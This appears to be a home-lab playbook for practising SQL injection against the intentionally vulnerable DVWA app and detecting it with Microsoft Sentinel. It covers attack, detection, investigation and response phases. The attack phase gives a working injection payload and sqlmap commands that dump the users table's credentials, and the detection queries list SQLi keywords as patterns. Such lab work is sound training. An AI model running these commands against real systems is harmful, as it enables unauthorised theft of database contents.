# 03 — Injection / SQL Injection (OWASP A03)

**Target app:** DVWA (SQL Injection module). **Local mode (current):** http://localhost:8081.
*(Azure-VM mode, if quota is later approved: port 80 on the victim VM behind the NSG.)*
**Attacker:** Kali VM or your host (`sqlmap`, `curl`, Burp Suite).
**Defender products:** AWS→Azure stack — Microsoft Sentinel (Activity + VM logs), Defender for
Cloud, NSG/flow logs, and (where the app logs) web server logs shipped to `law-redblue-lab`.

> **Scope / ethics:** DVWA is an intentionally vulnerable app that *you* own in *your* lab, reachable
> only from your home IP. Nothing here targets third-party systems.

---

## Attack phase

**Goal:** extract database contents via SQL injection in the DVWA `id` parameter.

1. Confirm reachability from Kali (home IP is NSG-allowlisted):
   ```bash
   curl -s http://<victim-public-ip>/login.php -o /dev/null -w "%{http_code}\n"
   ```
2. Log into DVWA (`admin` / `password`), set security to **Low**, open **SQL Injection**.
3. Manual proof of injection in the `id` field:
   ```
   1' OR '1'='1
   ```
   Returns more rows than a single id → injectable.
4. Automated extraction with sqlmap (use your authenticated session cookie):
   ```bash
   sqlmap -u "http://<victim-public-ip>/vulnerabilities/sqli/?id=1&Submit=Submit" \
     --cookie="security=low; PHPSESSID=<your-session>" \
     --batch --dbs                      # enumerate databases
   sqlmap -u "...same url..." --cookie="..." --batch -D dvwa --tables
   sqlmap -u "...same url..." --cookie="..." --batch -D dvwa -T users --dump   # dump creds
   ```

**Telemetry generated:**
- Many HTTP requests to `/vulnerabilities/sqli/` with anomalous query strings (SQL keywords,
  `UNION`, `SLEEP`, quotes) — in web/app logs if shipped to the workspace.
- A spike in requests from a single source IP (your home IP) in NSG flow logs.
- sqlmap's default User-Agent (unless changed) is a strong signature.

---

## Detection phase

Primary signal is **web request content**. If DVWA/Apache logs are collected to the workspace
(custom log or syslog via the Azure Monitor Agent, wired when the VM exists), hunt for SQLi
patterns. Example (adjust table/field names to your log source):

```kql
// SQL injection patterns in collected web logs (table name depends on your DCR)
Syslog
| where TimeGenerated > ago(1h)
| where SyslogMessage has_any ("UNION SELECT", "' OR '1'='1", "sqlmap", "information_schema", "SLEEP(")
| project TimeGenerated, HostName, SyslogMessage
| sort by TimeGenerated desc
```

Volume-based fallback (works from NSG flow logs even without app logs):

```kql
// Burst of inbound connections to the victim web port from one source
AzureNetworkAnalytics_CL
| where TimeGenerated > ago(1h)
| where DestPort_d in (80, 3000)
| summarize Hits = count() by SrcIP_s, bin(TimeGenerated, 5m)
| where Hits > 100
| sort by Hits desc
```

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application).
**OWASP:** A03:2021 Injection.

**Honest detection gap:** With DVWA on **Low** and no WAF in front, Azure has limited native
visibility into *application-layer* SQLi unless you collect the web server logs. Defender for
Cloud will flag the VM's exposure/posture but will not parse the SQLi payload itself. This gap
is the point of the exercise — document it.

---

## Investigation phase

1. Pivot on the source IP from the detection → confirm it is your Kali/home IP (expected in lab).
2. Timeline the requests: first probe (`' OR '1'='1`) → enumeration → `--dump`.
3. Identify what was accessed: the `users` table dump = credential exposure. Treat the dumped
   accounts as compromised.
4. Check `AzureActivity` for any follow-on control-plane actions from the same window (did the
   "attacker" try to pivot to Azure resources?):
   ```kql
   AzureActivity
   | where TimeGenerated > ago(2h)
   | project TimeGenerated, Caller, CallerIpAddress, OperationNameValue, ActivityStatusValue
   | sort by TimeGenerated desc
   ```

---

## Response phase

1. **Contain:** tighten the NSG (temporarily remove the HTTP allow rule) to stop further access.
2. **Eradicate:** reset DVWA, rotate any credentials that were dumped.
3. **Harden (the real lesson):**
   - Put a **WAF** / rule-based filtering in front of the app (managed rules catch SQLi).
   - Raise DVWA security level to show parameterized-query defense.
   - Enable web log collection so the SQLi is actually *visible* to Sentinel next time.
4. **Detect better:** convert the Syslog KQL above into a scheduled Sentinel analytics rule
   (Phase 14) with entity mapping SrcIP → IP, severity High.

---

## Lab-specific KQL (quick reference)

```kql
// Did anyone hit the SQLi endpoint at all? (requires web logs collected)
Syslog
| where TimeGenerated > ago(24h)
| where SyslogMessage has "/vulnerabilities/sqli/"
| summarize Requests = count() by bin(TimeGenerated, 10m)
| render timechart
```

> Status: playbook ready. Execution steps run during Phase 11–13 once the victim VM is deployed
> (currently blocked on the Bsv2 vCPU quota). The AzureActivity queries already return live data.
